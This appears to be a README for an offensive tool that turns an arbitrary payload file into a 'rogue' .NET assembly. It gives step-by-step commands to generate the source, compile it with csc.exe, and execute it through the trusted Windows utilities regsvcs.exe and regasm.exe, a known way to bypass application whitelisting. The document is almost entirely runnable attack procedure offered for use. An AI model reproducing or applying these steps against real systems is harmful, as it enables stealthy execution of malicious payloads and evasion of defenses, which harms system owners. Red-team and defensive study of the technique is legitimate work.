## Rogue .NET Assembly for Regsvcs/Regasm Code Execution

Follow below described steps to properly generate your source code and then compile it to a .NET Assembly valid for Regasm/Regsvcs:

### Step 1: Generate key.snk file

```
powershell -file build.ps1
```

### Step 2: Generate source code file

```
python3 generateRegsvcs.py -r payload.bin > program.cs
```

###  Step 3: Compilate library .NET Assembly

```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk program.cs
```
 
If you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script). Then proper compilation command will be:

```
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:regsvcs.dll /keyfile:key.snk program.cs
```


### Step 4: Code execution via Regsvcs or Regasm:

```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll 
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
```
